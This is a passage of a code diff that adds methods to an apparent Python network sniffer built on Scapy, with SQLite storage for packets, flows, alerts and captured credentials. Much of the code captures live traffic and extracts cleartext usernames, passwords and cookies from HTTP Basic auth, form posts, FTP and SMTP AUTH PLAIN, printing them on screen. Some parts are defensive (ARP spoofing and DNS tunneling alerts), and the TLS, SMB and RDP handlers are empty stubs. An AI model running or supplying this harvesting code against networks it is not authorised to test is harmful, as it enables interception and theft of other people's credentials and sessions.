+            print(f"{Fore.CYAN}{'─' * 60}{Style.RESET_ALL}")
+            if config['output_pcap']:
+                print(f"  PCAP File:         {config['pcap_file']}")
+            if config['output_json']:
+                print(f"  JSON File:         {config['json_file']}")
+            if config['enable_database']:
+                print(f"  Database:          {config['db_file']}")
+        
+        def _check_packet_sniffer_dependencies(self, config):
+            """Check required dependencies"""
+            from colorama import Fore, Style
+            import os
+            
+            all_ok = True
+            
+            # Check Scapy
+            try:
+                from scapy.all import sniff, wrpcap, rdpcap
+                print(f"{Fore.GREEN}✓ Scapy available{Style.RESET_ALL}")
+            except ImportError:
+                print(f"{Fore.RED}✗ Scapy not available{Style.RESET_ALL}")
+                print(f"{Fore.BLUE}ℹ  Install: pip3 install scapy{Style.RESET_ALL}")
+                all_ok = False
+            
+            # Check root privileges if required
+            if config['require_root'] and os.geteuid() != 0:
+                print(f"{Fore.YELLOW}⚠  Warning: Not running as root{Style.RESET_ALL}")
+                print(f"{Fore.BLUE}ℹ  Some features may not work without root privileges{Style.RESET_ALL}")
+            else:
+                print(f"{Fore.GREEN}✓ Root privileges available{Style.RESET_ALL}")
+            
+            # Check optional dependencies
+            try:
+                import dpkt
+                print(f"{Fore.GREEN}✓ dpkt available (enhanced dissection){Style.RESET_ALL}")
+            except ImportError:
+                print(f"{Fore.YELLOW}⚠  dpkt not available (optional){Style.RESET_ALL}")
+            
+            try:
+                import pyshark
+                print(f"{Fore.GREEN}✓ pyshark available (Wireshark integration){Style.RESET_ALL}")
+            except ImportError:
+                print(f"{Fore.YELLOW}⚠  pyshark not available (optional){Style.RESET_ALL}")
+            
+            return all_ok
+        
+        def _initialize_packet_sniffer_database(self, config):
+            """Initialize SQLite database for packet capture"""
+            from colorama import Fore, Style
+            import sqlite3
+            import os
+            
+            try:
+                db_path = config['db_file']
+                
+                # Create database
+                conn = sqlite3.connect(db_path)
+                cursor = conn.cursor()
+                
+                # Campaigns table
+                cursor.execute('''
+                    CREATE TABLE IF NOT EXISTS campaigns (
+                        id INTEGER PRIMARY KEY AUTOINCREMENT,
+                        name TEXT NOT NULL,
+                        start_time TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
+                        end_time TIMESTAMP,
+                        interface TEXT,
+                        filter TEXT,
+                        packets_captured INTEGER DEFAULT 0,
+                        bytes_captured INTEGER DEFAULT 0,
+                        alerts_generated INTEGER DEFAULT 0,
+                        credentials_found INTEGER DEFAULT 0,
+                        files_extracted INTEGER DEFAULT 0,
+                        status TEXT DEFAULT 'active'
+                    )
+                ''')
+                
+                # Packets table
+                cursor.execute('''
+                    CREATE TABLE IF NOT EXISTS packets (
+                        id INTEGER PRIMARY KEY AUTOINCREMENT,
+                        campaign_id INTEGER NOT NULL,
+                        timestamp REAL NOT NULL,
+                        src_ip TEXT,
+                        dst_ip TEXT,
+                        src_port INTEGER,
+                        dst_port INTEGER,
+                        protocol TEXT,
+                        length INTEGER,
+                        flags TEXT,
+                        ttl INTEGER,
+                        payload_size INTEGER,
+                        payload TEXT,
+                        FOREIGN KEY (campaign_id) REFERENCES campaigns(id)
+                    )
+                ''')
+                
+                # Flows table (TCP/UDP sessions)
+                cursor.execute('''
+                    CREATE TABLE IF NOT EXISTS flows (
+                        id INTEGER PRIMARY KEY AUTOINCREMENT,
+                        campaign_id INTEGER NOT NULL,
+                        start_time REAL NOT NULL,
+                        end_time REAL,
+                        src_ip TEXT NOT NULL,
+                        dst_ip TEXT NOT NULL,
+                        src_port INTEGER,
+                        dst_port INTEGER,
+                        protocol TEXT NOT NULL,
+                        packets_forward INTEGER DEFAULT 0,
+                        packets_backward INTEGER DEFAULT 0,
+                        bytes_forward INTEGER DEFAULT 0,
+                        bytes_backward INTEGER DEFAULT 0,
+                        duration REAL,
+                        state TEXT,
+                        FOREIGN KEY (campaign_id) REFERENCES campaigns(id)
+                    )
+                ''')
+                
+                # Alerts table
+                cursor.execute('''
+                    CREATE TABLE IF NOT EXISTS alerts (
+                        id INTEGER PRIMARY KEY AUTOINCREMENT,
+                        campaign_id INTEGER NOT NULL,
+                        timestamp REAL NOT NULL,
+                        alert_type TEXT NOT NULL,
+                        severity TEXT NOT NULL,
+                        source_ip TEXT,
+                        destination_ip TEXT,
+                        description TEXT,
+                        details TEXT,
+                        FOREIGN KEY (campaign_id) REFERENCES campaigns(id)
+                    )
+                ''')
+                
+                # Credentials table
+                cursor.execute('''
+                    CREATE TABLE IF NOT EXISTS credentials (
+                        id INTEGER PRIMARY KEY AUTOINCREMENT,
+                        campaign_id INTEGER NOT NULL,
+                        timestamp REAL NOT NULL,
+                        protocol TEXT NOT NULL,
+                        source_ip TEXT NOT NULL,
+                        destination_ip TEXT NOT NULL,
+                        username TEXT,
+                        password TEXT,
+                        additional_data TEXT,
+                        FOREIGN KEY (campaign_id) REFERENCES campaigns(id)
+                    )
+                ''')
+                
+                # HTTP requests table
+                cursor.execute('''
+                    CREATE TABLE IF NOT EXISTS http_requests (
+                        id INTEGER PRIMARY KEY AUTOINCREMENT,
+                        campaign_id INTEGER NOT NULL,
+                        timestamp REAL NOT NULL,
+                        source_ip TEXT NOT NULL,
+                        method TEXT NOT NULL,
+                        host TEXT,
+                        path TEXT,
+                        user_agent TEXT,
+                        referer TEXT,
+                        cookies TEXT,
+                        headers TEXT,
+                        FOREIGN KEY (campaign_id) REFERENCES campaigns(id)
+                    )
+                ''')
+                
+                # DNS queries table
+                cursor.execute('''
+                    CREATE TABLE IF NOT EXISTS dns_queries (
+                        id INTEGER PRIMARY KEY AUTOINCREMENT,
+                        campaign_id INTEGER NOT NULL,
+                        timestamp REAL NOT NULL,
+                        source_ip TEXT NOT NULL,
+                        query_name TEXT NOT NULL,
+                        query_type TEXT,
+                        response_ip TEXT,
+                        ttl INTEGER,
+                        FOREIGN KEY (campaign_id) REFERENCES campaigns(id)
+                    )
+                ''')
+                
+                # Files table
+                cursor.execute('''
+                    CREATE TABLE IF NOT EXISTS extracted_files (
+                        id INTEGER PRIMARY KEY AUTOINCREMENT,
+                        campaign_id INTEGER NOT NULL,
+                        timestamp REAL NOT NULL,
+                        protocol TEXT NOT NULL,
+                        source_ip TEXT NOT NULL,
+                        filename TEXT,
+                        file_type TEXT,
+                        file_size INTEGER,
+                        file_hash TEXT,
+                        file_path TEXT,
+                        FOREIGN KEY (campaign_id) REFERENCES campaigns(id)
+                    )
+                ''')
+                
+                # Statistics table
+                cursor.execute('''
+                    CREATE TABLE IF NOT EXISTS statistics (
+                        id INTEGER PRIMARY KEY AUTOINCREMENT,
+                        campaign_id INTEGER NOT NULL,
+                        timestamp REAL NOT NULL,
+                        metric_name TEXT NOT NULL,
+                        metric_value REAL NOT NULL,
+                        FOREIGN KEY (campaign_id) REFERENCES campaigns(id)
+                    )
+                ''')
+                
+                # Create indexes for performance
+                cursor.execute('CREATE INDEX IF NOT EXISTS idx_packets_campaign ON packets(campaign_id)')
+                cursor.execute('CREATE INDEX IF NOT EXISTS idx_packets_timestamp ON packets(timestamp)')
+                cursor.execute('CREATE INDEX IF NOT EXISTS idx_flows_campaign ON flows(campaign_id)')
+                cursor.execute('CREATE INDEX IF NOT EXISTS idx_alerts_campaign ON alerts(campaign_id)')
+                cursor.execute('CREATE INDEX IF NOT EXISTS idx_alerts_type ON alerts(alert_type)')
+                cursor.execute('CREATE INDEX IF NOT EXISTS idx_credentials_campaign ON credentials(campaign_id)')
+                
+                # Insert campaign record
+                cursor.execute('''
+                    INSERT INTO campaigns (name, interface, filter)
+                    VALUES (?, ?, ?)
+                ''', (
+                    f"Capture_{int(config['start_time'])}",
+                    config['interface'],
+                    config['bpf_filter'] or 'None'
+                ))
+                
+                config['campaign_id'] = cursor.lastrowid
+                
+                conn.commit()
+                conn.close()
+                
+                print(f"{Fore.GREEN}✓ Database initialized: {db_path}{Style.RESET_ALL}")
+                print(f"{Fore.GREEN}✓ Campaign ID: {config['campaign_id']}{Style.RESET_ALL}")
+                
+                return True
+                
+            except Exception as e:
+                print(f"{Fore.RED}✗ Database error: {str(e)}{Style.RESET_ALL}")
+                return False
+        
+        def _validate_capture_interface(self, config):
+            """Validate network interface"""
+            from colorama import Fore, Style
+            import os
+            
+            try:
+                # Get available interfaces
+                from scapy.all import get_if_list, conf
+                
+                interfaces = get_if_list()
+                
+                if config['interface'] not in interfaces:
+                    print(f"{Fore.RED}✗ Interface '{config['interface']}' not found{Style.RESET_ALL}")
+                    print(f"\n{Fore.CYAN}Available interfaces:{Style.RESET_ALL}")
+                    for iface in interfaces:
+                        print(f"  • {iface}")
+                    return False
+                
+                print(f"{Fore.GREEN}✓ Interface '{config['interface']}' validated{Style.RESET_ALL}")
+                
+                # Display interface info
+                try:
+                    from scapy.all import get_if_addr, get_if_hwaddr
+                    ip_addr = get_if_addr(config['interface'])
+                    mac_addr = get_if_hwaddr(config['interface'])
+                    print(f"  IP:  {ip_addr}")
+                    print(f"  MAC: {mac_addr}")
+                except Exception as e:
+                    # Silently handle exception - consider logging in production
+                    if hasattr(self, "debug") and getattr(self, "debug", False):
+                        print(f"[DEBUG] Exception: {e}")
+                
+                return True
+                
+            except Exception as e:
+                print(f"{Fore.RED}✗ Interface validation error: {str(e)}{Style.RESET_ALL}")
+                return False
+        
+        def _setup_capture_environment(self, config):
+            """Setup capture environment"""
+            from colorama import Fore, Style
+            import os
+            
+            try:
+                # Create output directories
+                output_dir = os.path.dirname(config['pcap_file']) if '/' in config['pcap_file'] else '.'
+                if output_dir and not os.path.exists(output_dir):
+                    os.makedirs(output_dir)
+                
+                # Create file extraction directory
+                if config['extract_files']:
+                    files_dir = f"extracted_files_{int(config['start_time'])}"
+                    if not os.path.exists(files_dir):
+                        os.makedirs(files_dir)
+                    config['files_dir'] = files_dir
+                    print(f"{Fore.GREEN}✓ File extraction directory: {files_dir}{Style.RESET_ALL}")
+                
+                print(f"{Fore.GREEN}✓ Capture environment ready{Style.RESET_ALL}")
+                return True
+                
+            except Exception as e:
+                print(f"{Fore.RED}✗ Setup error: {str(e)}{Style.RESET_ALL}")
+                return False
+        
+        def _display_capture_plan(self, config):
+            """Display capture plan"""
+            from colorama import Fore, Style
+            
+            print(f"\n{Fore.CYAN}{'=' * 80}{Style.RESET_ALL}")
+            print(f"{Fore.CYAN}CAPTURE PLAN{Style.RESET_ALL}")
+            print(f"{Fore.CYAN}{'=' * 80}{Style.RESET_ALL}\n")
+            
+            print(f"{Fore.YELLOW}Capture Target:{Style.RESET_ALL}")
+            print(f"  • Interface: {config['interface']}")
+            print(f"  • Filter: {config['bpf_filter'] or 'All traffic'}")
+            
+            if config['packet_count'] > 0:
+                print(f"  • Limit: {config['packet_count']} packets")
+            elif config['capture_duration'] > 0:
+                print(f"  • Duration: {config['capture_duration']} seconds")
+            else:
+                print(f"  • Duration: Until interrupted (Ctrl+C)")
+            
+            print(f"\n{Fore.YELLOW}Active Features:{Style.RESET_ALL}")
+            features = []
+            if config['deep_inspection']:
+                features.append("Deep Packet Inspection")
+            if config['extract_credentials']:
+                features.append("Credential Extraction")
+            if config['enable_anomaly_detection']:
+                features.append("Anomaly Detection")
+            if config['extract_files']:
+                features.append("File Extraction")
+            if config['traffic_statistics']:
+                features.append("Traffic Statistics")
+            
+            for feature in features:
+                print(f"  • {feature}")
+            
+            print(f"\n{Fore.YELLOW}Output:{Style.RESET_ALL}")
+            if config['output_pcap']:
+                print(f"  • PCAP: {config['pcap_file']}")
+            if config['output_json']:
+                print(f"  • JSON: {config['json_file']}")
+            if config['enable_database']:
+                print(f"  • Database: {config['db_file']}")
+        
+        def _execute_packet_capture(self, config):
+            """Execute packet capture with real-time analysis"""
+            from colorama import Fore, Style
+            from scapy.all import sniff, wrpcap
+            import threading
+            import time
+            import queue
+            
+            # Packet queue for async processing
+            packet_queue = queue.Queue(maxsize=config['packet_queue_size'])
+            captured_packets = []
+            
+            # Statistics tracking
+            stats = {
+                'packets_by_protocol': {},
+                'packets_by_port': {},
+                'top_talkers': {},
+                'start_time': time.time(),
+                'last_display': time.time()
+            }
+            
+            # Display lock
+            display_lock = threading.Lock()
+            
+            def packet_handler(packet):
+                """Handle each captured packet"""
+                try:
+                    # Add to queue for processing
+                    if config['async_processing']:
+                        try:
+                            packet_queue.put(packet, block=False)
+                        except queue.Full:
+                            # Packet queue full - dropping packet (expected under high load)
+                            return  # Skip this packet
+                    else:
+                        # Process immediately
+                        self._process_packet(packet, config, stats, display_lock)
+                    
+                    # Store for PCAP output
+                    if config['output_pcap']:
+                        captured_packets.append(packet)
+                    
+                    config['packets_captured'] += 1
+                    
+                    # Check packet count limit
+                    if config['packet_count'] > 0 and config['packets_captured'] >= config['packet_count']:
+                        config['stop_flag'] = True
+                        return True  # Stop sniffing
+                    
+                except Exception as e:
+                    if config['debug_mode']:
+                        print(f"{Fore.RED}✗ Packet handler error: {str(e)}{Style.RESET_ALL}")
+            
+            def packet_processor():
+                """Background packet processor thread"""
+                while not config['stop_flag']:
+                    try:
+                        packet = packet_queue.get(timeout=1)
+                        self._process_packet(packet, config, stats, display_lock)
+                        packet_queue.task_done()
+                    except queue.Empty:
+                        continue
+                    except Exception as e:
+                        if config['debug_mode']:
+                            print(f"{Fore.RED}✗ Processor error: {str(e)}{Style.RESET_ALL}")
+            
+            def stats_display():
+                """Display statistics periodically"""
+                while not config['stop_flag']:
+                    time.sleep(config['display_interval'])
+                    if config['realtime_display']:
+                        self._display_statistics(config, stats, display_lock)
+            
+            def duration_monitor():
+                """Monitor capture duration"""
+                if config['capture_duration'] > 0:
+                    time.sleep(config['capture_duration'])
+                    config['stop_flag'] = True
+            
+            # Start background threads
+            threads = []
+            
+            if config['async_processing'] and config['use_threading']:
+                for i in range(config['thread_pool_size']):
+                    t = threading.Thread(target=packet_processor, daemon=True)
+                    t.start()
+                    threads.append(t)
+            
+            if config['realtime_display']:
+                stats_thread = threading.Thread(target=stats_display, daemon=True)
+                stats_thread.start()
+                threads.append(stats_thread)
+            
+            if config['capture_duration'] > 0:
+                duration_thread = threading.Thread(target=duration_monitor, daemon=True)
+                duration_thread.start()
+                threads.append(duration_thread)
+            
+            # Start capture
+            print(f"{Fore.GREEN}🟢 Capture started - Press Ctrl+C to stop{Style.RESET_ALL}\n")
+            
+            try:
+                # Build filter
+                bpf_filter = config['bpf_filter'] if config['bpf_filter'] else None
+                
+                # Start sniffing
+                sniff(
+                    iface=config['interface'],
+                    prn=packet_handler,
+                    filter=bpf_filter,
+                    store=False,
+                    stop_filter=lambda p: config['stop_flag']
+                )
+                
+            except Exception as e:
+                print(f"\n{Fore.RED}✗ Capture error: {str(e)}{Style.RESET_ALL}")
+            
+            finally:
+                # Signal threads to stop
+                config['stop_flag'] = True
+                
+                # Wait for queue to empty
+                if config['async_processing']:
+                    packet_queue.join()
+                
+                # Save PCAP file
+                if config['output_pcap'] and captured_packets:
+                    print(f"\n{Fore.CYAN}Saving PCAP file...{Style.RESET_ALL}")
+                    wrpcap(config['pcap_file'], captured_packets)
+                    print(f"{Fore.GREEN}✓ PCAP saved: {config['pcap_file']} ({len(captured_packets)} packets){Style.RESET_ALL}")
+        
+        def _process_packet(self, packet, config, stats, display_lock):
+            """Process individual packet"""
+            from colorama import Fore, Style
+            from scapy.all import IP, TCP, UDP, ICMP, Raw, ARP, DNS
+            import time
+            
+            try:
+                timestamp = time.time()
+                
+                # Extract basic info
+                src_ip = None
+                dst_ip = None
+                src_port = None
+                dst_port = None
+                protocol = None
+                payload = None
+                
+                # IP Layer
+                if IP in packet:
+                    src_ip = packet[IP].src
+                    dst_ip = packet[IP].dst
+                    protocol = packet[IP].proto
+                    
+                    # Update statistics
+                    with display_lock:
+                        stats['top_talkers'][src_ip] = stats['top_talkers'].get(src_ip, 0) + 1
+                    
+                    # TCP Layer
+                    if TCP in packet:
+                        src_port = packet[TCP].sport
+                        dst_port = packet[TCP].dport
+                        protocol = 'TCP'
+                        
+                        with display_lock:
+                            port_key = f"TCP/{dst_port}"
+                            stats['packets_by_port'][port_key] = stats['packets_by_port'].get(port_key, 0) + 1
+                        
+                        # Deep inspection
+                        if config['deep_inspection']:
+                            self._inspect_tcp_packet(packet, config, src_ip, dst_ip, src_port, dst_port)
+                    
+                    # UDP Layer
+                    elif UDP in packet:
+                        src_port = packet[UDP].sport
+                        dst_port = packet[UDP].dport
+                        protocol = 'UDP'
+                        
+                        with display_lock:
+                            port_key = f"UDP/{dst_port}"
+                            stats['packets_by_port'][port_key] = stats['packets_by_port'].get(port_key, 0) + 1
+                        
+                        # Deep inspection
+                        if config['deep_inspection']:
+                            self._inspect_udp_packet(packet, config, src_ip, dst_ip, src_port, dst_port)
+                    
+                    # ICMP Layer
+                    elif ICMP in packet:
+                        protocol = 'ICMP'
+                    
+                    # Extract payload
+                    if Raw in packet and config['payload_analysis']:
+                        payload = bytes(packet[Raw].load)
+                
+                # ARP Layer
+                elif ARP in packet:
+                    protocol = 'ARP'
+                    src_ip = packet[ARP].psrc
+                    dst_ip = packet[ARP].pdst
+                    
+                    # Detect ARP spoofing
+                    if config['detect_arp_spoof']:
+                        self._detect_arp_spoof(packet, config)
+                
+                # Update protocol statistics
+                if protocol:
+                    with display_lock:
+                        stats['packets_by_protocol'][protocol] = stats['packets_by_protocol'].get(protocol, 0) + 1
+                
+                # Store in database
+                if config['enable_database'] and config['store_packets']:
+                    self._store_packet(config, timestamp, src_ip, dst_ip, src_port, dst_port, protocol, len(packet), payload)
+                
+                # Display packet
+                if config['realtime_display'] and config['display_mode'] == 'detailed':
+                    self._display_packet(packet, src_ip, dst_ip, src_port, dst_port, protocol, display_lock)
+                
+            except Exception as e:
+                if config['debug_mode']:
+                    print(f"{Fore.RED}✗ Packet processing error: {str(e)}{Style.RESET_ALL}")
+        
+        def _inspect_tcp_packet(self, packet, config, src_ip, dst_ip, src_port, dst_port):
+            """Inspect TCP packet for protocols and patterns"""
+            from scapy.all import Raw
+            
+            try:
+                if not Raw in packet:
+                    return
+                
+                payload = bytes(packet[Raw].load)
+                payload_str = payload.decode('utf-8', errors='ignore')
+                
+                # HTTP Analysis
+                if config['analyze_http'] and (dst_port == 80 or src_port == 80):
+                    if payload_str.startswith(('GET ', 'POST ', 'PUT ', 'DELETE ', 'HEAD ', 'OPTIONS ')):
+                        self._analyze_http_request(packet, config, src_ip, dst_ip, payload_str)
+                    elif payload_str.startswith('HTTP/'):
+                        self._analyze_http_response(packet, config, src_ip, dst_ip, payload_str)
+                
+                # HTTPS/TLS Analysis
+                if config['analyze_https'] and (dst_port == 443 or src_port == 443):
+                    self._analyze_tls_packet(packet, config, src_ip, dst_ip, payload)
+                
+                # FTP Analysis
+                if config['analyze_ftp'] and (dst_port == 21 or src_port == 21):
+                    self._analyze_ftp_packet(packet, config, src_ip, dst_ip, payload_str)
+                
+                # SMTP Analysis
+                if config['analyze_smtp'] and (dst_port == 25 or src_port == 25 or dst_port == 587):
+                    self._analyze_smtp_packet(packet, config, src_ip, dst_ip, payload_str)
+                
+                # SSH Analysis
+                if config['analyze_ssh'] and (dst_port == 22 or src_port == 22):
+                    self._analyze_ssh_packet(packet, config, src_ip, dst_ip, payload)
+                
+                # Telnet Analysis
+                if config['analyze_telnet'] and (dst_port == 23 or src_port == 23):
+                    self._analyze_telnet_packet(packet, config, src_ip, dst_ip, payload_str)
+                
+                # SMB Analysis
+                if config['analyze_smb'] and (dst_port == 445 or src_port == 445):
+                    self._analyze_smb_packet(packet, config, src_ip, dst_ip, payload)
+                
+                # RDP Analysis
+                if config['analyze_rdp'] and (dst_port == 3389 or src_port == 3389):
+                    self._analyze_rdp_packet(packet, config, src_ip, dst_ip, payload)
+                
+                # Pattern matching
+                if config['enable_pattern_matching']:
+                    self._match_patterns(packet, config, payload_str)
+                
+            except Exception as e:
+                if config['debug_mode']:
+                    print(f"TCP inspection error: {str(e)}")
+        
+        def _inspect_udp_packet(self, packet, config, src_ip, dst_ip, src_port, dst_port):
+            """Inspect UDP packet"""
+            from scapy.all import DNS, Raw
+            
+            try:
+                # DNS Analysis
+                if DNS in packet and config['analyze_dns']:
+                    self._analyze_dns_packet(packet, config, src_ip, dst_ip)
+                
+                # Check for DNS tunneling
+                if config['detect_dns_tunnel'] and DNS in packet:
+                    self._detect_dns_tunnel(packet, config, src_ip)
+                
+            except Exception as e:
+                if config['debug_mode']:
+                    print(f"UDP inspection error: {str(e)}")
+        
+        def _analyze_http_request(self, packet, config, src_ip, dst_ip, payload):
+            """Analyze HTTP request"""
+            from colorama import Fore, Style
+            import re
+            import time
+            
+            try:
+                lines = payload.split('\n')
+                if not lines:
+                    return
+                
+                # Parse request line
+                request_line = lines[0]
+                method = request_line.split()[0] if len(request_line.split()) > 0 else ''
+                path = request_line.split()[1] if len(request_line.split()) > 1 else ''
+                
+                # Parse headers
+                headers = {}
+                for line in lines[1:]:
+                    if ':' in line:
+                        key, value = line.split(':', 1)
+                        headers[key.strip().lower()] = value.strip()
+                
+                host = headers.get('host', '')
+                user_agent = headers.get('user-agent', '')
+                cookies = headers.get('cookie', '')
+                
+                # Extract credentials
+                if config['extract_credentials']:
+                    # Basic Auth
+                    if 'authorization' in headers:
+                        auth_header = headers['authorization']
+                        if auth_header.startswith('Basic '):
+                            import base64
+                            try:
+                                decoded = base64.b64decode(auth_header[6:]).decode('utf-8')
+                                if ':' in decoded:
+                                    username, password = decoded.split(':', 1)
+                                    self._store_credentials(config, 'HTTP-Basic', src_ip, dst_ip, username, password)
+                                    print(f"\n{Fore.RED}🔐 HTTP BASIC AUTH: {username}:{password} from {src_ip}{Style.RESET_ALL}")
+                            except Exception as e:
+                                # Silently handle exception - consider logging in production
+                                if hasattr(self, "debug") and getattr(self, "debug", False):
+                                    print(f"[DEBUG] Exception: {e}")
+                    
+                    # Form data
+                    if method == 'POST' and len(lines) > len(headers) + 2:
+                        body = lines[-1]
+                        if 'username=' in body or 'password=' in body or 'email=' in body:
+                            self._extract_form_credentials(config, src_ip, dst_ip, body)
+                
+                # Extract cookies
+                if config['extract_cookies'] and cookies:
+                    self._store_cookies(config, src_ip, host, cookies)
+                
+                # Store HTTP request in database
+                if config['enable_database']:
+                    self._store_http_request(config, src_ip, method, host, path, user_agent, cookies)
+                
+                # Check for suspicious patterns
+                if config['detect_suspicious_traffic']:
+                    self._check_http_suspicious(config, src_ip, method, path, headers)
+                
+            except Exception as e:
+                if config['debug_mode']:
+                    print(f"HTTP analysis error: {str(e)}")
+        
+        def _analyze_http_response(self, packet, config, src_ip, dst_ip, payload):
+            """Analyze HTTP response"""
+            try:
+                # Extract Set-Cookie headers
+                if config['extract_cookies'] and 'Set-Cookie:' in payload:
+                    lines = payload.split('\n')
+                    for line in lines:
+                        if line.startswith('Set-Cookie:'):
+                            cookie = line.split(':', 1)[1].strip()
+                            self._store_cookies(config, dst_ip, '', cookie)
+            except Exception as e:
+                # Silently handle exception - consider logging in production
+                if hasattr(self, "debug") and getattr(self, "debug", False):
+                    print(f"[DEBUG] Exception: {e}")
+        
+        def _analyze_dns_packet(self, packet, config, src_ip, dst_ip):
+            """Analyze DNS packet"""
+            from scapy.all import DNS, DNSQR, DNSRR
+            import time
+            
+            try:
+                if DNS in packet and packet[DNS].qr == 0:  # Query
+                    query_name = packet[DNSQR].qname.decode('utf-8') if packet.haslayer(DNSQR) else ''
+                    query_type = packet[DNSQR].qtype if packet.haslayer(DNSQR) else 0
+                    
+                    # Store DNS query
+                    if config['enable_database']:
+                        self._store_dns_query(config, src_ip, query_name, query_type)
+                
+                elif DNS in packet and packet[DNS].qr == 1:  # Response
+                    if packet.haslayer(DNSRR):
+                        for i in range(packet[DNS].ancount):
+                            dnsrr = packet[DNSRR][i] if packet[DNS].ancount > 1 else packet[DNSRR]
+                            response_ip = dnsrr.rdata if hasattr(dnsrr, 'rdata') else ''
+                            # Could store response
+            except Exception as e:
+                # Silently handle exception - consider logging in production
+                if hasattr(self, "debug") and getattr(self, "debug", False):
+                    print(f"[DEBUG] Exception: {e}")
+        
+        def _analyze_ftp_packet(self, packet, config, src_ip, dst_ip, payload):
+            """Analyze FTP packet"""
+            from colorama import Fore, Style
+            
+            try:
+                if 'USER ' in payload and config['extract_ftp_creds']:
+                    username = payload.split('USER ')[1].split('\r\n')[0]
+                    # Store username, wait for PASS
+                    if not hasattr(self, '_ftp_users'):
+                        self._ftp_users = {}
+                    self._ftp_users[src_ip] = username
+                
+                elif 'PASS ' in payload and config['extract_ftp_creds']:
+                    password = payload.split('PASS ')[1].split('\r\n')[0]
+                    username = self._ftp_users.get(src_ip, 'unknown')
+                    self._store_credentials(config, 'FTP', src_ip, dst_ip, username, password)
+                    print(f"\n{Fore.RED}🔐 FTP CREDENTIALS: {username}:{password} from {src_ip}{Style.RESET_ALL}")
+            except Exception as e:
+                # Silently handle exception - consider logging in production
+                if hasattr(self, "debug") and getattr(self, "debug", False):
+                    print(f"[DEBUG] Exception: {e}")
+        
+        def _analyze_smtp_packet(self, packet, config, src_ip, dst_ip, payload):
+            """Analyze SMTP packet"""
+            from colorama import Fore, Style
+            import base64
+            
+            try:
+                if 'AUTH PLAIN' in payload and config['extract_smtp_creds']:
+                    try:
+                        auth_data = payload.split('AUTH PLAIN ')[1].split('\r\n')[0]
+                        decoded = base64.b64decode(auth_data).decode('utf-8')
+                        parts = decoded.split('\x00')
+                        if len(parts) >= 3:
+                            username = parts[1]
+                            password = parts[2]
+                            self._store_credentials(config, 'SMTP', src_ip, dst_ip, username, password)
+                            print(f"\n{Fore.RED}🔐 SMTP CREDENTIALS: {username}:{password} from {src_ip}{Style.RESET_ALL}")
+                    except Exception as e:
+                        # Silently handle exception - consider logging in production
+                        if hasattr(self, "debug") and getattr(self, "debug", False):
+                            print(f"[DEBUG] Exception: {e}")
+            except Exception as e:
+                # Silently handle exception - consider logging in production
+                if hasattr(self, "debug") and getattr(self, "debug", False):
+                    print(f"[DEBUG] Exception: {e}")
+        
+        def _analyze_telnet_packet(self, packet, config, src_ip, dst_ip, payload):
+            """Analyze Telnet packet"""
+            from colorama import Fore, Style
+            
+            try:
+                if config['extract_telnet_creds']:
+                    # Telnet credentials are harder to extract, typically need session reassembly
+                    # This is a simplified version
+                    if 'login:' in payload.lower() or 'username:' in payload.lower():
+                        print(f"\n{Fore.YELLOW}⚠  Telnet login prompt detected from {src_ip}{Style.RESET_ALL}")
+            except Exception as e:
+                # Silently handle exception - consider logging in production
+                if hasattr(self, "debug") and getattr(self, "debug", False):
+                    print(f"[DEBUG] Exception: {e}")
+        
+        def _analyze_tls_packet(self, packet, config, src_ip, dst_ip, payload):
+            """Analyze TLS/SSL packet"""
+            try:
+                # TLS handshake analysis
+                # Check for SSL/TLS version, cipher suites, etc.
+                # This would require more complex parsing
+                pass
+            except Exception as e:
+                # Silently handle exception - consider logging in production
+                if hasattr(self, "debug") and getattr(self, "debug", False):
+                    print(f"[DEBUG] Exception: {e}")
+        
+        def _analyze_ssh_packet(self, packet, config, src_ip, dst_ip, payload):
+            """Analyze SSH packet"""
+            try:
+                # SSH version detection
+                if payload.startswith(b'SSH-'):
+                    version = payload.split(b'\r\n')[0].decode('utf-8', errors='ignore')
+                    # Could log SSH version
+            except Exception as e:
+                # Silently handle exception - consider logging in production
+                if hasattr(self, "debug") and getattr(self, "debug", False):
+                    print(f"[DEBUG] Exception: {e}")
+        
+        def _analyze_smb_packet(self, packet, config, src_ip, dst_ip, payload):
+            """Analyze SMB packet"""
+            try:
+                # SMB analysis - complex protocol
+                # Would need proper SMB parser
+                pass
+            except Exception as e:
+                # Silently handle exception - consider logging in production
+                if hasattr(self, "debug") and getattr(self, "debug", False):
+                    print(f"[DEBUG] Exception: {e}")
+        
+        def _analyze_rdp_packet(self, packet, config, src_ip, dst_ip, payload):
+            """Analyze RDP packet"""
+            try:
+                # RDP analysis
+                pass
+            except Exception as e:
+                # Silently handle exception - consider logging in production
+                if hasattr(self, "debug") and getattr(self, "debug", False):
+                    print(f"[DEBUG] Exception: {e}")
+        
+        def _detect_arp_spoof(self, packet, config):
+            """Detect ARP spoofing"""
+            from scapy.all import ARP
+            from colorama import Fore, Style
+            import time
+            
+            try:
+                if not hasattr(self, '_arp_cache'):
+                    self._arp_cache = {}
+                
+                ip = packet[ARP].psrc
+                mac = packet[ARP].hwsrc
+                
+                # Check if IP-MAC binding changed
+                if ip in self._arp_cache:
+                    if self._arp_cache[ip] != mac:
+                        # Possible ARP spoofing
+                        alert_msg = f"ARP spoofing detected: {ip} changed from {self._arp_cache[ip]} to {mac}"
+                        print(f"\n{Fore.RED}🚨 ALERT: {alert_msg}{Style.RESET_ALL}")
+                        
+                        if config['enable_database']:
+                            self._store_alert(config, 'arp_spoof', 'high', ip, '', alert_msg)
+                
+                self._arp_cache[ip] = mac
+                
+            except Exception as e:
+                # Silently handle exception - consider logging in production
+                if hasattr(self, "debug") and getattr(self, "debug", False):
+                    print(f"[DEBUG] Exception: {e}")
+        
+        def _detect_dns_tunnel(self, packet, config, src_ip):
+            """Detect DNS tunneling"""
+            from scapy.all import DNS, DNSQR
+            from colorama import Fore, Style
+            
+            try:
+                if packet.haslayer(DNSQR):
+                    query = packet[DNSQR].qname.decode('utf-8')
+                    
+                    # Check for suspicious patterns
+                    # Long subdomain names (>50 chars)
+                    # High entropy
+                    # Unusual TLDs
+                    if len(query) > 50:
+                        alert_msg = f"Possible DNS tunneling: Long query from {src_ip}: {query}"
+                        print(f"\n{Fore.YELLOW}⚠  ALERT: {alert_msg}{Style.RESET_ALL}")
+                        
+                        if config['enable_database']:
+                            self._store_alert(config, 'dns_tunnel', 'medium', src_ip, '', alert_msg)
+            except Exception as e:
+                # Silently handle exception - consider logging in production
+                if hasattr(self, "debug") and getattr(self, "debug", False):
+                    print(f"[DEBUG] Exception: {e}")
+        
+        def _detect_port_scan(self, config, stats):
+            """Detect port scanning"""
